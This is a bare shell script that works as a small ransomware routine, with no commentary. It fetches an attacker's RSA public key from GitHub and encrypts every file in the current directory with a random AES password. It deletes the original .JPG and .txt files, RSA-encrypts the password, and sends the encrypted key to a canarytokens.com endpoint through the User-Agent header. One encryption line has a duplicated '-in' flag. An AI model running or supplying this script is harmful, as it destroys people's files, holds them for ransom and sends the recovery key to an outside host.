curl https://raw.githubusercontent.com/skickar/Research/master/key.txt | base64 --decode | cat > pub1.pem
openssl rand -hex 32 -out randompassword
cat randompassword
for f in * ; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in -in $f -out $f.enc -pass file:./randompassword ; done ; rm *.JPG ; rm *.txt
openssl rsautl -encrypt -inkey pub1.pem -pubin -in randompassword -out randompassword.encrypted && rm randompassword
curl --silent --output /dev/null -A "$(base64 randompassword.encrypted)" http://canarytokens.com/feedback/zdzfa7z9ik2f4s213alpo2z5r/index.html
